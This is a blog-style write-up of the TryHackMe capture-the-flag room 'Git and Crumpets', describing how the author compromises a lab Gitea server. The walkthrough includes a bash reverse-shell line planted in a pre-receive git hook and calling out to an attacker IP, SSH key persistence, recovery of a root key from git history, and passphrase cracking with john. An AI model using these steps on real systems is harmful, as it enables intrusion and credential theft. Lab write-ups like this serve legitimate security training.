---
layout: post
title:  "Git and Crumpets (THM)"
date:   2025-08-01 23:48:43 -0400
author: robo.uzi
tags: [CTF, TryHackMe]
---

Prompt: Our devs have been clamoring for some centralized version control, so the admin came through. Rumour has it that they included a few countermeasures...

## Initial Compromise

`nmap -p- -T5 -vv 10.10.230.35 -oN gitandfullnmap.txt`

`nmap -sVC -p 22,80 -vv -T4 10.10.230.35 -oN gitandnmap.txt`:
```shell
PORT     STATE  SERVICE    REASON       VERSION  
22/tcp   open   ssh        syn-ack      OpenSSH 8.0 (protocol 2.0)  
80/tcp   open   http       syn-ack      nginx
```

Visiting the http server redirects me to getting rick rolled...

I can't `curl` the site. Or run `gobuster` or `ffuf`. It got my ip banned and I had to restart the machine twice. Ok fine no brute forcing. At this point I install httpie with `sudo snap install httpie` so I can proxy the request through my terminal.

I run `http -v http://10.10.230.35` and am able to see the response:
```html
   <main>  
     <h1>Nothing to see here, move along</h1>  
     <h2>Notice:</h2>  
     <p>    
       Hey guys,  
          I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet.    
          In the meantime, here's a fun video I found!  
       Hydra  
     </p>  
     <pre>
```

I add `git.git-and-crumpets.thm` to my `/etc/hosts` file.

Visiting `http://git.git-and-crumpets.thm/` I see a website advertising a self hosted Git service.

I register an account on the site and start looking around. Under the users tab I see other people:
```text
hydra
hydragyrum@example.com

root groot
root@example.com

scones
withcream@example.com

test
test@test.thm
```

In `http://git.git-and-crumpets.thm/scones/cant-touch-this/commits/branch/master` I find the hint `I kept the password in my avatar to be more secure.` from scones.

I download his avatar and see this: 
```shell
strings scones.png | grep Password  
My 'Password' should be easy enough to guess
```

I login with the credentials `...`. Now that Im logged into this account I can access a settings tab under scones repository. The user has access to git hooks. They are custom scripts that are executed when a certain trigger condition is met. Git allows two types of hooks: client side and server side hooks. `https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks`.

I go to the pre recieve git hooks at `http://git.git-and-crumpets.thm/scones/cant-touch-this/settings/hooks/git/pre-receive` and add the line `/bin/bash -i >& /dev/tcp/10.13.66.123/4444 0>&1`. I set my listener like this: `nc -lvnp 4444`.

By editing the `readme.md` I can trigger the RCE but some outgoing network connections are blocked. I get the message:
```shell
`./hooks/pre-receive.d/pre-receive: connect: Connection refused   
./hooks/pre-receive.d/pre-receive: line 24: /dev/tcp/10.13.66.123/4444: Connection refused`
```

If I edit the pre recieve git hook to contain `ping -c 3 10.13.66.123` I see this in the full rejection message:
```shell
`PING 10.13.66.123 (10.13.66.123) 56(84) bytes of data.   
64 bytes from 10.13.66.123: icmp_seq=1 ttl=61 time=215 ms   
64 bytes from 10.13.66.123: icmp_seq=2 ttl=61 time=212 ms   
64 bytes from 10.13.66.123: icmp_seq=3 ttl=61 time=216 ms      
--- 10.13.66.123 ping statistics ---   3 packets transmitted, 3 received, 0% packet loss, time 5ms   rtt min/avg/max/mdev = 212.456/214.595/215.957/1.622 ms   *** Project description file hasn't been set   error: hook declined to update refs/heads/master`
```

All traffic isnt blocked so I will change the port to a higher number and try that.

___

## Priv Esc

Setting it to port `41789` works. I get a reverse shell.

I fix my shell with:
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

I find `user.txt` in `/home/git`.

To use ssh I run `ssh-keygen -t rsa -b 2048 -f git_key`. I add `git_key.pub` to `authorized_keys` and ssh into the machine with `ssh git@10.10.230.35 -i git_key`.

I look for what the user `git` owns: `find / -xdev -user git 2> /dev/null`. 

I find `/var/lib/gitea` which is interesting.

In `/var/lib/gitea/data/gitea-repositories` I find that `root` does have a repository. 

Inside `/var/lib/gitea/data/gitea-repositories/root` I see `backup.git`. I run `git clone backup.git` and get a directory called backup.

Inside `backup` I run `git log --oneline -all`.

I see 4 entries:
```shell
c242a46 (origin/dotfiles) Add '.gitconfig'  
26f204c Delete file  
0b23539 Add '.ssh/Sup3rS3cur3'  
24dfc45 (HEAD -> master, origin/master, origin/HEAD) Initial commit
```

I run `git show 0b23539` and I am able to to steal an ssh key. I put it into a file and delete the `+` at the beginning of each line. The key has a passphrase on it so I download `ssh2john.py` from `https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py` and run `python3 ssh2john.py id_rsa > ssh.hash` then `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash`. After a while I give up on cracking it and think about generating my own wordlist or looking for hints. 

I try the name of the key and it works! I grab the `root.txt`, base64 decode it, and that's it.

___
